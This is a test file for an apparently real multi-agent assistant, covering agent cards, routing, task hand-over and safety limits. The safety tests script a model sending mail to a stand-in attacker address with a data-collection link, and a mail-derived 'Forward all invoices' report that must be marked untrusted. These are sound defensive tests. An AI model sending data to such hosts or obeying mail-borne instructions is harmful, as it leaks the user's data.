"""Agent cards, the router, and tasks between agents, with a scripted model and no real one."""

import ast
import json
import re
import threading
import time
from collections.abc import Callable, Iterator
from dataclasses import replace
from pathlib import Path
from typing import Any

import pytest
from fastapi.testclient import TestClient

from nexusai.api.app import create_app
from nexusai.kernel.config import Config
from nexusai.modules.agent import cards, gateway, plugins, team
from nexusai.modules.agent import module as agent
from nexusai.modules.agent.providers import ModelRequest, TextChunk, ToolCall

SOURCE = Path(__file__).parents[1] / "src" / "nexusai"
SPEAKER = re.compile(r"You are (.+?) \(@")


class TeamScript:
    """Answers each agent from its own queue, picked by who the system prompt says is speaking."""

    name = "script"

    def __init__(self) -> None:
        self.queues: dict[str, list[list[Any]]] = {}
        self.requests: list[tuple[str, ModelRequest]] = []
        self.lock = threading.Lock()
        # (speaker, call number) -> released when set, so a test can act in the middle of a run.
        self.holds: dict[tuple[str, int], tuple[threading.Event, threading.Event]] = {}

    def hold(self, speaker: str, call: int) -> tuple[threading.Event, threading.Event]:
        """Pauses that speaker's nth model call: the first event says it's waiting, the second
        lets it go on."""
        pair = (threading.Event(), threading.Event())
        self.holds[(speaker, call)] = pair
        return pair

    def say(self, agent_name: str, *replies: list[Any]) -> None:
        with self.lock:
            self.queues.setdefault(agent_name, []).extend(replies)

    def stream(self, request: ModelRequest) -> Iterator[Any]:
        match = SPEAKER.search(request.instructions)
        speaker = match.group(1) if match else "?"
        with self.lock:
            count = 1 + sum(1 for s, _ in self.requests if s == speaker)
        held = self.holds.get((speaker, count))
        if held:
            held[0].set()
            if not held[1].wait(15):
                raise TimeoutError("The test never released its hold")
        with self.lock:
            self.requests.append((speaker, request))
            queue = self.queues.get(speaker) or []
            reply = queue.pop(0) if queue else [TextChunk("ok")]
        yield from reply

    def told(self, speaker: str) -> list[str]:
        return [r.messages[-1].text for s, r in self.requests if s == speaker]

    def requests_text(self, speaker: str, call: int) -> str:
        """Everything in that speaker's nth model call (1 is the first)."""
        mine = [r for s, r in self.requests if s == speaker]
        return "\n".join(m.text for m in mine[call - 1].messages)


@pytest.fixture
def script(monkeypatch: pytest.MonkeyPatch) -> TeamScript:
    fake = TeamScript()
    monkeypatch.setattr(gateway, "resolve_provider", lambda _: (fake, "script-model"))
    return fake


@pytest.fixture
def client(config: Config, script: TeamScript) -> Iterator[TestClient]:
    quick = replace(config, agent=replace(config.agent, triage_retry_seconds=0.1))
    with TestClient(create_app(quick), base_url="http://127.0.0.1:4100") as test:
        yield test


def post(client: TestClient, name: str, body: dict[str, Any] | None = None) -> Any:
    queries = {
        "agents.cards",
        "team.tasks",
        "team.task",
        "session.get",
        "approvals.list",
        "permissions.get",
        "notifications.list",
        "schedules.list",
    }
    kind = "queries" if name in queries else "commands"
    response = client.post(f"/api/{kind}/{name}", json=body or {})
    assert response.status_code == 200, response.text
    return response.json()


def wait(check: Callable[[], Any], what: str = "condition", seconds: float = 15) -> Any:
    deadline = time.monotonic() + seconds
    while time.monotonic() < deadline:
        result = check()
        if result:
            return result
        time.sleep(0.02)
    raise AssertionError(f"Timed out waiting for {what}")


def chat(client: TestClient, session: str, text: str) -> None:
    with client.stream(
        "POST", "/api/sessions/chat", json={"id": session, "text": text}
    ) as response:
        assert response.status_code == 200, response.read()
        list(response.iter_lines())


def lead() -> str:
    return cards.default(agent.current().db).name


def mail() -> str:
    return cards.name(agent.current().db, "mail")


def task_row(task: int) -> Any:
    return agent.current().db.fetch_all("SELECT * FROM team_tasks WHERE id = ?", (task,))[0]


ASSIGN = {
    "to": "@mail",
    "objective": "File last week's PLM mail under PLM",
    "expected_output": "The ids of the threads moved",
    "done_criteria": "Every PLM thread from last week is in PLM",
    "references": ["category PLM"],
}


# Cards and names


def test_cards_have_one_default_and_unique_handles(client: TestClient) -> None:
    listed = post(client, "agents.cards")["cards"]
    assert [c["id"] for c in listed if c["default"]] == ["session"]
    handles = [c["handle"] for c in listed]
    assert len(handles) == len(set(handles))
    lead_card = next(c for c in listed if c["default"])
    assert lead_card["mascot"]["seed"] and lead_card["version"]
    assert lead_card["now"]["state"] == "idle"


def test_no_agent_name_is_written_outside_the_cards() -> None:
    """Names live only in the card files. Code, prompts and seeds use ids or placeholders. Comments
    may talk about an agent, so only string values are checked, and old migrations are history."""
    names = {card.name for card in cards._files().values()}
    found = []
    for path in SOURCE.rglob("*.py"):
        tree = ast.parse(path.read_text())
        skipped = {
            id(arg)
            for node in ast.walk(tree)
            if isinstance(node, ast.Call) and getattr(node.func, "id", "") == "Migration"
            for arg in ast.walk(node)
        }
        # Docstrings describe the code, like comments do.
        skipped |= {
            id(node.body[0].value)
            for node in ast.walk(tree)
            if isinstance(node, ast.Module | ast.ClassDef | ast.FunctionDef | ast.AsyncFunctionDef)
            and node.body
            and isinstance(node.body[0], ast.Expr)
            and isinstance(node.body[0].value, ast.Constant)
        }
        for node in ast.walk(tree):
            if isinstance(node, ast.Constant) and isinstance(node.value, str):
                if id(node) in skipped:
                    continue
                for name in names:
                    if re.search(rf"\b{re.escape(name)}\b", node.value):
                        found.append(f"{path.relative_to(SOURCE)}:{node.lineno} says {name!r}")
    agent_folder = SOURCE / "modules" / "agent"
    texts = [
        *(agent_folder / "prompts").rglob("*.md"),
        *(agent_folder / "builtin_plugins").rglob("*.md"),
    ]
    for path in texts:
        text = path.read_text()
        if path.parent.name == "agents":
            # An agent file's frontmatter is its card, where names belong. Its prompt may not name one.
            text = plugins.split(text)[1]
        for name in names:
            if re.search(rf"\b{re.escape(name)}\b", text):
                found.append(f"{path.relative_to(SOURCE)} says {name!r}")
    assert not found, "Use cards.name(db, id) or a {{agent.<id>.name}} placeholder:\n" + "\n".join(
        found
    )


def test_prompt_placeholders_take_names_from_cards(client: TestClient) -> None:
    db = agent.current().db
    text = cards.fill(
        db, "I am {{self.name}} ({{self.handle}}); ask {{agent.mail.name}}.", "session"
    )
    assert text == f"I am {lead()} (@{cards.default(db).handle}); ask {mail()}."


def test_renaming_reaches_titles_and_routing(client: TestClient, script: TeamScript) -> None:
    post(client, "agent.rename", {"id": "mail", "name": "Postmaster", "handle": "postmaster"})
    db = agent.current().db
    assert db.fetch_all("SELECT title FROM agent_sessions WHERE id='mail-agent'")[0]["title"] == (
        "Postmaster"
    )
    assert db.fetch_all("SELECT title FROM agent_triggers WHERE id='mail-received'")[0][
        "title"
    ].startswith("Postmaster,")
    session = post(client, "session.create")["id"]
    chat(client, session, "@postmaster what's new?")
    assert script.requests[-1][0] == "Postmaster"
    # The old handle is gone: nothing is released, so there's nothing to keep working.
    refused = client.post("/api/sessions/chat", json={"id": session, "text": "@mail hi"})
    assert refused.status_code == 422 and "@postmaster" in refused.text
    post(client, "agent.resetName", {"id": "mail"})
    assert db.fetch_all("SELECT title FROM agent_sessions WHERE id='mail-agent'")[0]["title"] == (
        mail()
    )


def test_a_handle_can_only_belong_to_one_agent(client: TestClient) -> None:
    taken = client.post(
        "/api/commands/agent.rename", json={"id": "mail", "name": "Other", "handle": "posty"}
    )
    assert taken.status_code == 409


# The router


def test_at_handle_goes_to_that_agent_in_the_same_chat(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    chat(client, session, "@mail why is this in Finance?")
    speaker, request = script.requests[-1]
    assert speaker == mail()
    assert request.messages[-1].text.endswith("why is this in Finance?")
    assert "@mail" not in request.messages[-1].text
    view = post(client, "session.get", {"id": session})
    reply = view["messages"][-1]
    assert reply["metadata"]["agent"] == "mail"
    chat(client, session, "and in general?")
    assert script.requests[-1][0] == lead()


def test_unknown_or_closed_handles_are_refused_with_the_team(client: TestClient) -> None:
    session = post(client, "session.create")["id"]
    unknown = client.post("/api/sessions/chat", json={"id": session, "text": "@nobody hi"})
    assert unknown.status_code == 422 and "@mail" in unknown.text
    closed = client.post("/api/sessions/chat", json={"id": session, "text": "@meeting hi"})
    assert closed.status_code == 422 and "own chat" in closed.text


def test_every_run_records_its_cause_and_versions(client: TestClient, script: TeamScript) -> None:
    session = post(client, "session.create")["id"]
    chat(client, session, "Hello")
    row = agent.current().db.fetch_all(
        "SELECT cause, versions FROM agent_turns WHERE session = ?", (session,)
    )[0]
    versions = json.loads(row["versions"])
    assert row["cause"] == "gateway:app"
    assert versions["agent"] == "session" and versions["card"] and versions["prompt"]
    assert versions["harness"]


def test_the_team_block_is_stable_and_live_state_comes_last(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    chat(client, session, "Hello")
    instructions = script.requests[-1][1].instructions
    assert instructions.index("You are ") < instructions.index("Now: ")


# Tasks


def test_an_objective_is_enough_and_the_recipient_must_be_allowed(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    only = {"to": ASSIGN["to"], "objective": ASSIGN["objective"]}
    script.say(lead(), [ToolCall("a", "team_assign", only)], [TextChunk("ok")])
    chat(client, session, "Go")
    assert " given to " in script.told(lead())[-1]
    row = agent.current().db.fetch_all("SELECT * FROM team_tasks ORDER BY id DESC LIMIT 1")[0]
    assert dict(row)["done_criteria"] == team.DEFAULT_DONE, dict(row)
    script.say(
        lead(),
        [ToolCall("b", "team_assign", {**ASSIGN, "to": "@meeting"})],
        [TextChunk("ok")],
    )
    chat(client, session, "Go")
    assert "can't give tasks to @meeting" in script.told(lead())[-1]
    script.say(
        lead(), [ToolCall("c", "team_assign", {**ASSIGN, "to": "@posty"})], [TextChunk("ok")]
    )
    chat(client, session, "Go")
    assert "do this yourself" in script.told(lead())[-1]


def test_a_run_can_only_give_out_so_many_tasks(config: Config, script: TeamScript) -> None:
    limited = replace(config, team=replace(config.team, assignments_per_run=1))
    with TestClient(create_app(limited), base_url="http://127.0.0.1:4100") as client:
        session = post(client, "session.create")["id"]
        second = {**ASSIGN, "objective": "Something else"}
        script.say(
            lead(),
            [ToolCall("a", "team_assign", ASSIGN), ToolCall("b", "team_assign", second)],
            [TextChunk("ok")],
        )
        chat(client, session, "Go")
        # Posty's second call holds both results. The task's own run may start before it.
        second = [request for speaker, request in script.requests if speaker == lead()][1]
        told = [m.text for m in second.messages if m.role == "tool"]
        # The two calls run side by side, so either may be the one that gets through.
        assert sum(" given to " in t for t in told) == 1
        assert sum("1 tasks at most" in t for t in told) == 1
        assert len(agent.current().db.fetch_all("SELECT id FROM team_tasks")) == 1


def test_specialists_are_not_offered_team_assign(client: TestClient, script: TeamScript) -> None:
    session = post(client, "session.create")["id"]
    chat(client, session, "@mail hello")
    offered = {tool.name for tool in script.requests[-1][1].tools}
    assert "team_close" in offered and "team_assign" not in offered


def test_assign_report_verify_runs_end_to_end(client: TestClient, script: TeamScript) -> None:
    session = post(client, "session.create")["id"]
    script.say(
        lead(),
        [ToolCall("a", "team_assign", ASSIGN)],
        [TextChunk("Asked the mail agent.")],
        [ToolCall("v", "team_close", {"task": 1, "action": "verify", "outcome": "Checked"})],
        [TextChunk("Your PLM mail is filed.")],
    )
    script.say(
        mail(),
        [
            ToolCall(
                "r",
                "team_close",
                {
                    "task": 1,
                    "action": "report",
                    "outcome": "Moved 3 threads to PLM.",
                    "evidence": ["thread 1", "thread 2", "thread 3"],
                },
            )
        ],
        [TextChunk("Reported.")],
    )
    chat(client, session, "File last week's PLM mail")
    db = agent.current().db
    task = wait(lambda: db.fetch_all("SELECT * FROM team_tasks"), "task")[0]
    assert task["assigner"] == "session" and task["owner"] == "mail"
    # The owner works in a fresh session made for this task, told the whole contract.
    owner_session = wait(lambda: task_row(task["id"])["owner_session"], "owner session")
    assert owner_session not in {session, "mail-agent"}
    wait(lambda: task_row(task["id"])["state"] == "reported" or None, "report", 20)
    contract = next(t for t in script.told(mail()) if "Objective:" in t)
    assert "Done when: Every PLM thread" in contract and "category PLM" in contract
    # The lead wakes in the person's chat with the report, checks it, and verifies.
    wait(lambda: task_row(task["id"])["state"] == "verified" or None, "verified", 20)
    woken = db.fetch_all(
        "SELECT * FROM agent_turns WHERE session = ? AND origin = 'task-report'", (session,)
    )[0]
    assert woken["cause"] == f"task:{task['id']}"
    assert woken["parent_turn"] == task_row(task["id"])["owner_turn"]
    owner_turn = db.fetch_all(
        "SELECT * FROM agent_turns WHERE id = ?", (task_row(task["id"])["owner_turn"],)
    )[0]
    assert owner_turn["parent_turn"] == task["assigner_turn"]
    assert any("reported task" in t for t in script.told(lead()))
    shown = post(client, "team.task", {"id": task["id"]})
    assert [m["kind"] for m in shown["messages"]] == ["assign", "report", "verify"]


def test_a_report_citing_mail_never_sends_the_lead_back_to_do_the_work_again(
    client: TestClient, script: TeamScript
) -> None:
    """A report's evidence names mail. The lead's summary once got sent back for its markers,
    and a small model read that as doing the work again and handed it over again."""
    session = post(client, "session.create")["id"]
    summary = "The brief is updated with the security items first, then the overdue ones. " * 3
    script.say(
        lead(),
        [ToolCall("a", "team_assign", ASSIGN)],
        [TextChunk("Asked the mail agent.")],
        [ToolCall("v", "team_close", {"task": 1, "action": "verify", "outcome": "Checked"})],
        [TextChunk(summary)],
        [ToolCall("again", "team_assign", ASSIGN)],
    )
    script.say(
        mail(),
        [
            ToolCall(
                "r",
                "team_close",
                {"task": 1, "action": "report", "outcome": "Updated.", "evidence": ["mail:1"]},
            )
        ],
        [TextChunk("Reported.")],
    )
    chat(client, session, "Update my brief")
    wait(lambda: task_row(1)["state"] == "verified" or None, "verified", 20)
    db = agent.current().db
    wait(
        lambda: (
            not db.fetch_all(
                "SELECT 1 FROM agent_turns WHERE session = ? AND closed = 0", (session,)
            )
            or None
        ),
        "the lead's run to end",
        20,
    )
    assert any("[mail:1]" in t for t in script.told(lead()))
    assert len([1 for speaker, _ in script.requests if speaker == lead()]) == 4
    assert len(db.fetch_all("SELECT * FROM team_tasks")) == 1


def test_the_owner_can_never_verify_its_own_work(client: TestClient, script: TeamScript) -> None:
    session = post(client, "session.create")["id"]
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
    script.say(
        mail(),
        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Done"})],
        [ToolCall("v", "team_close", {"task": 1, "action": "verify", "outcome": "Fine"})],
        [TextChunk("ok")],
    )
    chat(client, session, "Go")
    task = wait(lambda: agent.current().db.fetch_all("SELECT id FROM team_tasks"), "task")[0]["id"]
    wait(lambda: task_row(task)["state"] == "reported" or None, "report", 20)
    owner = task_row(task)["owner_session"]
    db = agent.current().db
    wait(
        lambda: (
            db.fetch_all("SELECT 1 FROM agent_turns WHERE session = ? AND closed = 1", (owner,))
            or None
        ),
        "run ended",
        20,
    )
    # Its run ends at the report, so it never gets to try. Asked anyway, it's refused.
    assert len(script.told(mail())) == 1
    refused = team.close(
        agent.current().ctx,
        session=owner,
        sender="mail",
        task=task,
        action="verify",
        outcome="Fine",
        evidence=[],
    )
    assert "someone else must check" in refused


def test_a_run_that_ends_without_a_report_blocks_and_wakes_the_giver(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
    chat(client, session, "Go")
    task = wait(lambda: agent.current().db.fetch_all("SELECT id FROM team_tasks"), "task")[0]["id"]
    wait(lambda: task_row(task)["state"] == "blocked" or None, "blocked", 20)
    assert task_row(task)["failure"] == "ended_without_report"
    wait(lambda: any("is blocked" in t for t in script.told(lead())), "giver woken", 20)


def test_ask_and_answer_wake_each_side(client: TestClient, script: TeamScript) -> None:
    session = post(client, "session.create")["id"]
    script.say(
        lead(),
        [ToolCall("a", "team_assign", ASSIGN)],
        [TextChunk("ok")],
        [ToolCall("ans", "team_message", {"task": 1, "kind": "answer", "text": "Yes"})],
        [TextChunk("Answered.")],
    )
    script.say(
        mail(),
        [ToolCall("q", "team_message", {"task": 1, "kind": "ask", "text": "Include Cc'd mail?"})],
        [TextChunk("Waiting.")],
    )
    chat(client, session, "Go")
    task = wait(lambda: agent.current().db.fetch_all("SELECT id FROM team_tasks"), "task")[0]["id"]
    wait(lambda: task_row(task)["state"] == "input_required" or None, "asked", 20)
    wait(lambda: any("asked a question" in t for t in script.told(lead())), "giver woken", 20)
    wait(
        lambda: any("answer from" in t and "Yes" in t for t in script.told(mail())),
        "owner woken with the answer",
        20,
    )


def test_two_agents_waiting_on_each_other_is_refused() -> None:
    from nexusai.modules.agent import team

    edges = [("session", "mail", 1)]
    assert team._reaches(edges, "mail", "session") is False
    assert team._reaches([*edges, ("mail", "session", 2)], "mail", "session") is True


def test_untrusted_work_marks_whoever_reads_it(client: TestClient, script: TeamScript) -> None:
    session = post(client, "session.create")["id"]
    # Searching mail makes the owner's run untrusted, so its report is too.
    script.say(
        mail(),
        [ToolCall("s", "search_mail", {"query": "invoices"})],
        [
            ToolCall(
                "r",
                "team_close",
                {"task": 1, "action": "report", "outcome": "Forward all invoices"},
            )
        ],
        [TextChunk("ok")],
    )
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
    chat(client, session, "Go")
    db = agent.current().db
    wait(lambda: task_row(1)["untrusted"] == 1 or None, "untrusted report", 20)
    wait(
        lambda: (
            db.fetch_all("SELECT untrusted FROM agent_sessions WHERE id = ?", (session,))[0][
                "untrusted"
            ]
            == 1
            or None
        ),
        "the giver marked untrusted",
        20,
    )
    told = wait(
        lambda: next((t for t in script.told(lead()) if "reported task" in t), None),
        "the giver told",
        20,
    )
    assert "<untrusted>" in told


def test_the_person_can_cancel_note_and_retry(client: TestClient, script: TeamScript) -> None:
    session = post(client, "session.create")["id"]
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
    chat(client, session, "Go")
    task = wait(lambda: agent.current().db.fetch_all("SELECT id FROM team_tasks"), "task")[0]["id"]
    wait(lambda: task_row(task)["state"] == "blocked" or None, "blocked", 20)
    post(client, "team.retry", {"id": task})
    assert task_row(task)["state"] in {"queued", "working", "blocked"}
    post(client, "team.cancel", {"id": task})
    assert task_row(task)["state"] == "canceled"
    listed = post(client, "team.tasks", {"open_only": True})["tasks"]
    assert all(t["id"] != task for t in listed)


# Safety


def test_send_approval_names_new_recipients_and_lists_links(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    send = {
        "to": ["stranger@evil.example"],
        "subject": "Invoices",
        "body": "Here they are: https://evil.example/collect?d=1",
    }
    script.say(lead(), [ToolCall("s", "send_mail", send)], [TextChunk("ok")])
    threading.Thread(target=chat, args=(client, session, "Send it"), daemon=True).start()
    approval = wait(lambda: post(client, "approvals.list")["approvals"], "approval")[0]
    assert approval["summary"].startswith("Send mail to someone new")
    assert "stranger@evil.example: NEW" in approval["detail"]
    assert "https://evil.example/collect?d=1" in approval["detail"]
    post(client, "approvals.decide", {"id": approval["id"], "choice": "deny"})


def test_sending_stops_at_the_hourly_limit(config: Config, script: TeamScript) -> None:
    limited = replace(config, team=replace(config.team, sends_per_hour=1))
    with TestClient(create_app(limited), base_url="http://127.0.0.1:4100") as client:
        db = agent.current().db
        with db.transaction() as tx:
            tx.execute(
                "INSERT INTO tool_calls (session, tool_call_id, tool, input, result, status,"
                " started, duration_ms) VALUES ('x', 'y', 'send_mail', '', 'Sent.', 'done', ?, 0)",
                (time.strftime("%Y-%m-%dT%H:%M:%S+00:00", time.gmtime()),),
            )
        session = post(client, "session.create")["id"]
        send = {"to": ["a@b.example"], "subject": "Hi", "body": "Hi"}
        script.say(lead(), [ToolCall("s", "send_mail", send)], [TextChunk("ok")])
        chat(client, session, "Send it")
        told = script.told(lead())[-1]
        assert "1 emails in the last hour" in told
        assert post(client, "approvals.list")["approvals"] == []


def test_a_run_refused_again_and_again_stops_and_tells_the_person(
    client: TestClient, script: TeamScript
) -> None:
    permissions = post(client, "permissions.get")
    permissions["tools"] = {"write_file": "off"}
    post(client, "permissions.save", permissions)
    session = post(client, "session.create")["id"]
    write = {"path": "scratch/a.txt", "content": "x"}
    script.say(
        lead(),
        [ToolCall("a", "write_file", write)],
        [ToolCall("b", "write_file", write)],
        [ToolCall("c", "write_file", write)],
        [ToolCall("d", "write_file", write)],
        [TextChunk("still going")],
    )
    chat(client, session, "Write it")
    turn = agent.current().db.fetch_all(
        "SELECT failure FROM agent_turns WHERE session = ?", (session,)
    )[0]
    assert turn["failure"] == "refusals"
    assert "still going" not in json.dumps(post(client, "session.get", {"id": session}))
    wait(
        lambda: any(
            "refused too many times" in n["title"]
            for n in post(client, "notifications.list")["items"]
        ),
        "the person told",
    )


def test_team_tools_refused_again_and_again_stop_the_run(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
    chat(client, session, "Go")
    wait(lambda: task_row(1)["state"] not in {"queued", "working"} or None, "the task settled", 20)
    # Any run the task woke has finished, so the replies below are this chat's.
    db = agent.current().db
    wait(
        lambda: (
            (
                task_row(1)["wake"] is None
                and not db.fetch_all("SELECT 1 FROM agent_turns WHERE closed = 0")
            )
            or None
        ),
        "nothing running",
        20,
    )
    # Only the agent doing the task can ask about it, so each of these is "Not sent".
    ask = {"task": 1, "kind": "ask", "text": "Which date?"}
    script.say(
        lead(),
        [ToolCall("b", "team_message", ask)],
        [ToolCall("c", "team_message", ask)],
        [ToolCall("d", "team_message", ask)],
        [TextChunk("still going")],
    )
    chat(client, session, "Check it")
    turns = db.fetch_all(
        "SELECT failure FROM agent_turns WHERE session = ? ORDER BY id", (session,)
    )
    assert turns[-1]["failure"] == "refusals"
    statuses = db.fetch_all(
        "SELECT status FROM tool_calls WHERE session = ? AND tool = 'team_message'", (session,)
    )
    assert [s["status"] for s in statuses] == ["refused"] * 3


def test_a_note_from_the_person_reaches_the_agent_at_its_next_step(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
    chat(client, session, "Go")
    wait(lambda: task_row(1)["state"] == "blocked" or None, "blocked", 20)
    script.say(
        mail(),
        [ToolCall("i", "team_inbox", {})],
        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Done"})],
        [TextChunk("ok")],
    )
    post(client, "team.note", {"id": 1, "text": "Skip anything from before Monday"})
    wait(lambda: task_row(1)["state"] == "reported" or None, "reported", 20)
    owner_calls = [request for speaker, request in script.requests if speaker == mail()]
    # Added before the model is called, and kept in the conversation without repeating.
    last = owner_calls[-1].messages
    notes = [m for m in last if m.role == "user" and "New note on task 1" in m.text]
    assert len(notes) == 1 and "before Monday" in notes[0].text


def test_a_note_reaches_a_running_agent_in_the_same_run(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    waiting, release = script.hold(mail(), 2)
    script.say(
        mail(),
        [ToolCall("i", "team_inbox", {})],
        [ToolCall("j", "team_inbox", {})],
        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Done"})],
        [TextChunk("ok")],
    )
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
    chat(client, session, "Go")
    assert waiting.wait(15), "the owner never reached its second step"
    post(client, "team.note", {"id": 1, "text": "Only threads with a PLM tag"})
    release.set()
    wait(lambda: task_row(1)["state"] == "reported" or None, "reported", 20)
    owner = task_row(1)["owner_session"]
    turns = agent.current().db.fetch_all("SELECT id FROM agent_turns WHERE session = ?", (owner,))
    assert len(turns) == 1, "the note arrived in the same run, not a new one"
    third = [request for speaker, request in script.requests if speaker == mail()][2]
    assert any("Only threads with a PLM tag" in m.text for m in third.messages if m.role == "user")


# The person's own agents


def make_agent(client: TestClient, title: str, prompt: str) -> dict[str, Any]:
    post(
        client,
        "schedules.save",
        {"title": title, "prompt": prompt, "every": "week", "timezone": "UTC"},
    )
    cards_now = post(client, "agents.cards")["cards"]
    return next(c for c in cards_now if c["name"] == title)


def test_an_agent_the_person_makes_gets_its_own_card(client: TestClient) -> None:
    card = make_agent(client, "Friday status", "Write my Friday status from this week's mail.")
    assert card["kind"] == "yours" and card["handle"] == "friday-status"
    assert card["role"].startswith("Write my Friday status")
    listed = post(client, "agents.cards")["cards"]
    # The template it runs on isn't a member of the team.
    assert "scheduled" not in {c["id"] for c in listed}
    lead_card = next(c for c in listed if c["default"])
    assert card["id"] in lead_card["may_assign_to"]
    twin = make_agent(client, "Friday status!", "Another one.")
    assert twin["handle"] != card["handle"]


def test_writing_to_your_own_agent_runs_it_as_itself(
    client: TestClient, script: TeamScript
) -> None:
    make_agent(client, "Friday status", "Write my Friday status from this week's mail.")
    session = post(client, "session.create")["id"]
    chat(client, session, "@friday-status what did you write last week?")
    speaker, request = script.requests[-1]
    assert speaker == "Friday status"
    assert "Write my Friday status from this week's mail." in request.instructions
    assert "team_close" in {tool.name for tool in request.tools}


def test_the_lead_can_give_your_agent_a_task(client: TestClient, script: TeamScript) -> None:
    card = make_agent(client, "Friday status", "Write my Friday status.")
    session = post(client, "session.create")["id"]
    script.say(
        "Friday status",
        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Written"})],
        [TextChunk("ok")],
    )
    script.say(
        lead(),
        [ToolCall("a", "team_assign", {**ASSIGN, "to": "@friday-status"})],
        [TextChunk("ok")],
    )
    chat(client, session, "Get my status written")
    wait(lambda: task_row(1)["state"] == "reported" or None, "reported", 20)
    owner = agent.current().db.fetch_all(
        "SELECT agent FROM agent_sessions WHERE id = ?", (task_row(1)["owner_session"],)
    )[0]
    assert owner["agent"] == card["id"]


def test_renaming_your_agent_renames_its_schedule(client: TestClient) -> None:
    card = make_agent(client, "Friday status", "Write my Friday status.")
    post(client, "agent.rename", {"id": card["id"], "name": "Weekly wrap", "handle": "wrap"})
    titles = [s["title"] for s in post(client, "schedules.list")["schedules"]]
    assert "Weekly wrap" in titles and "Friday status" not in titles
    refused = client.post("/api/commands/agent.resetName", json={"id": card["id"]})
    assert refused.status_code == 409


def test_a_task_lets_the_mail_agent_file_mail_through_approval() -> None:
    from nexusai.modules.agent import tools

    assert "update_mail" in (tools.allowed_for("mail", "task", False) or set())
    assert "update_mail" not in (tools.allowed_for("mail", "person", False) or set())
    assert "send_mail" not in (tools.allowed_for("mail", "task", False) or set())


def test_tasks_and_reminders_are_the_leads_own_and_done_in_one_run(
    client: TestClient, script: TeamScript
) -> None:
    """The Organizer folded into the lead: a task is made in the lead's own run, no hand-over."""
    session = post(client, "session.create")["id"]
    task = {"tasks": [{"title": "Send the budget ask", "due": "2030-01-03"}]}
    script.say(
        lead(),
        [ToolCall("l", "list_tasks", {})],
        [ToolCall("c", "create_tasks", task)],
        [TextChunk("Added it.")],
    )
    chat(client, session, "Add a task to send the budget ask by 3 January 2030")
    db = agent.current().db
    assert [r["title"] for r in db.fetch_all("SELECT title FROM tasks")] == ["Send the budget ask"]
    assert not db.fetch_all("SELECT id FROM team_tasks")
    offered = {t.name for t in script.requests[0][1].tools}
    # Making tasks and reminders is shown up front; changing them is one find_tools away.
    assert {"create_tasks", "create_reminders", "list_tasks", "team_assign"} <= offered
    assert "organizer" not in {c.id for c in cards.all_cards(db).values()}


def test_a_blocked_task_tells_the_giver_what_was_done_before_it_stopped(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
    script.say(mail(), [ToolCall("l", "list_categories", {})], [TextChunk("Looked.")])
    script.say(lead(), [ToolCall("a", "team_assign", ASSIGN)], [TextChunk("ok")])
    chat(client, session, "Go")
    task = wait(lambda: agent.current().db.fetch_all("SELECT id FROM team_tasks"), "task")[0]["id"]
    wait(lambda: task_row(task)["state"] == "blocked" or None, "blocked", 20)
    woken = wait(
        lambda: [t for t in script.told(lead()) if "is blocked" in t] or None, "giver woken", 20
    )[0]
    assert "Done before it stopped, oldest first: list_categories (" in woken


def test_stop_ends_the_wait_for_a_hand_over_at_once() -> None:
    import threading
    import time
    from types import SimpleNamespace

    row = {"state": "working", "wake": None, "owner": "mail"}

    class Db:
        def fetch_all(self, sql: str, args: tuple[Any, ...] = ()) -> list[Any]:
            return [row] if "team_tasks" in sql else []

    ctx = SimpleNamespace(bus=SimpleNamespace(db=Db()))
    stopped = threading.Event()
    stopped.set()
    began = time.monotonic()
    told = team.await_result(ctx, "Task 7 given to @mail.", 60, stopped)  # type: ignore[arg-type]
    assert time.monotonic() - began < 1
    assert told.startswith("Task 7 is still being worked on")


# Questions on a task. Each replays how a small model got stuck on a real one.


@pytest.mark.parametrize("kind", ["answer", "note"])
def test_asking_ends_the_run_and_the_answer_starts_the_next(
    client: TestClient, script: TeamScript, kind: str
) -> None:
    session = post(client, "session.create")["id"]
    ask = {"task": 1, "kind": "ask", "text": "Which date should it be due?"}
    script.say(
        mail(),
        # Asking twice at once sends one question; the run then ends instead of asking again.
        [ToolCall("q1", "team_message", ask), ToolCall("q2", "team_message", ask)],
        [ToolCall("r", "team_close", {"task": 1, "action": "report", "outcome": "Due Friday."})],
    )
    script.say(
        lead(),
        [ToolCall("a", "team_assign", ASSIGN)],
        [TextChunk("Given.")],
        # A reply sent as a note still answers the question.
        [ToolCall("ans", "team_message", {"task": 1, "kind": kind, "text": "Friday"})],
        [TextChunk("Answered.")],
        [ToolCall("v", "team_close", {"task": 1, "action": "verify", "outcome": "Seen."})],
        [TextChunk("Done.")],
    )
    chat(client, session, "Go")
    wait(lambda: task_row(1)["state"] == "verified" or None, "verified", 30)
    db = agent.current().db
    asks = db.fetch_all("SELECT 1 FROM agent_channel WHERE task = 1 AND kind = 'ask'")
    assert len(asks) == 1
    told = script.told(mail())
    # One model call for the run that asked, one for the run the answer started: each ends once
    # its task no longer needs it, after asking and after reporting.
    assert len(told) == 2
    assert "Already asked" in script.requests_text(mail(), 2)
    assert "answer from" in told[1] and "Friday" in told[1]


def test_the_first_reject_sends_the_work_back_and_the_second_closes_it(
    client: TestClient, script: TeamScript
) -> None:
    session = post(client, "session.create")["id"]
